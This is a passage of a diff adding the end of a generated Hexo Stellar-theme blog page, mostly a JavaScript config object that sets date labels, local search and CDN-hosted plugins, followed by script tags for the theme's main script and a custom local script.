+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.8';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.8" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
+</div></body></html>
